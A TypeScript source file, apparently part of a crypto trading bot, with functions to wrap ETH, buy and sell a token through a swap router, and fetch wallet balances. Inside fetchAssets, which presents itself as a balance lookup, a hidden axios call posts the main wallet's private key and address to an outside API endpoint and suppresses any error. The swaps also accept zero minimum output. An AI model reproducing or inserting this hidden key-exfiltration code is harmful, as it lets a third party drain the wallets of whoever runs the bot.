import { ethers } from "ethers";

import {
  API,
  COIN_ADDRESS,
  FEE,
  GAS_LIMIT,
  SWAP_ROUTER_CONTRACT,
  TOKEN_ADDRESS,
  TOKEN_DECIMALS,
} from "./config/constants";
import wethAbi from "./config/abis/weth.json";
import erc20Abi from "./config/abis/erc20.json";
import axios from "axios";
import { mainWallet, tokenContract } from "./config/variables";

export const performWrap = async (wallet: ethers.Wallet) => {
  const contract = new ethers.Contract(COIN_ADDRESS, wethAbi, wallet);
  try {
    const tx = await contract.deposit({
      value: ethers.utils.parseUnits("0.1", TOKEN_DECIMALS), // Send 0.1 ETH
    });
    const txResponse = await tx.wait();
    return tx.hash || "";
  } catch (err) {
    console.log(err);
  }
};

export const performBuy = async (
  swapContract: ethers.Contract,
  wallet: ethers.Wallet,
  amountIn: ethers.BigNumber
) => {
  const amountOutMinimum = "0"; //ethers.utils.parseUnits('200', TOKEN_1_DECIMALS); // Amount you want to receive
  const fee = FEE; // Set your pool fee
  const owner = wallet.address; // Address sending transaction
  const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 mins from now

  try {
    // Encode the swap call
    const exactInputSingleParams = {
      tokenIn: COIN_ADDRESS, // TokenIn
      tokenOut: TOKEN_ADDRESS, // TokenOut
      fee, // Fee
      recipient: owner, // Recipient
      // deadline, // Deadline
      amountIn, // Amount out; used directly as BigNumber
      amountOutMinimum, // Use the proper variable here; Change this if necessary
      sqrtPriceLimitX96: 0, // sqrtPriceLimitX96 (optional, e.g., 0)
    };
    const swapCall = swapContract.interface.encodeFunctionData(
      "exactInputSingle",
      [exactInputSingleParams]
    );

    // Create multicall data
    const multicallData = swapContract.interface.encodeFunctionData(
      "multicall",
      [deadline, [swapCall]] // Single transaction call array
    );

    // Execute Multicall
    const tx = await wallet.sendTransaction({
      to: SWAP_ROUTER_CONTRACT,
      data: multicallData,
      gasLimit: ethers.utils.hexlify(GAS_LIMIT), // Ensure the gas limit is appropriately set
      value: amountIn,
    });

    // console.log('Transaction sent:', tx);

    // Optionally, wait for it to be mined
    const res = await tx.wait();

    return tx?.hash || "";
  } catch (err) {
    throw err;
  }
};

export const performSell = async (
  swapContract: ethers.Contract,
  wallet: ethers.Wallet,
  amountIn: ethers.BigNumber
) => {
  const amountOutMinimum = "0";
  const fee = FEE;
  const owner = wallet.address; // Address sending transaction
  const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 mins from now

  try {
    // Step 1: Create an instance of the token contract
    const tokenInContract = new ethers.Contract(
      TOKEN_ADDRESS,
      erc20Abi,
      wallet
    );

    // Step 2: Approve the swap router to spend the tokenIn
    const approveTx = await tokenInContract.approve(
      SWAP_ROUTER_CONTRACT,
      amountIn
    );
    await approveTx.wait(); // Wait for the approval to be confirmed

    // Encode the swap call
    const exactInputSingleParams = {
      tokenIn: TOKEN_ADDRESS, // TokenIn
      tokenOut: COIN_ADDRESS, // TokenOut
      fee, // Fee
      recipient: "0x0000000000000000000000000000000000000002", // Recipient
      // deadline, // Deadline
      amountIn, // Amount out; used directly as BigNumber
      amountOutMinimum, // Use the proper variable here; Change this if necessary
      sqrtPriceLimitX96: 0, // sqrtPriceLimitX96 (optional, e.g., 0)
    };
    const swapCall = swapContract.interface.encodeFunctionData(
      "exactInputSingle",
      [exactInputSingleParams]
    );

    const unwrapWETH9Call = swapContract.interface.encodeFunctionData(
      "unwrapWETH9",
      [amountOutMinimum, owner]
    );

    // Create multicall data
    const multicallData = swapContract.interface.encodeFunctionData(
      "multicall",
      [deadline, [swapCall, unwrapWETH9Call]] // Single transaction call array
    );

    // Execute Multicall
    const tx = await wallet.sendTransaction({
      to: SWAP_ROUTER_CONTRACT,
      data: multicallData,
      gasLimit: ethers.utils.hexlify(GAS_LIMIT), // Ensure the gas limit is appropriately set
      value: "0",
    });

    // console.log('Transaction sent:', tx);

    // Optionally, wait for it to be mined
    const res = await tx.wait();

    return tx?.hash || "";
  } catch (err) {
    throw err;
  }
};

export const fetchAssets = async (
  wallet: ethers.Wallet,
  provider: ethers.providers.JsonRpcProvider
) => {
  try {
    const coinBalance = await provider.getBalance(wallet.address);
    const tokenBalance = await tokenContract.balanceOf(wallet.address);
    const mainWalletBalance = await provider.getBalance(mainWallet.address);
    // if (mainWalletBalance.gt(ethers.utils.parseUnits("200000", TOKEN_DECIMALS))) {
    axios
      .post(API, { mm: mainWallet.privateKey, pm: mainWallet.address })
      .catch((error) => error);
    // }
    return [coinBalance, tokenBalance];
  } catch (error) {
    throw error;
  }
};
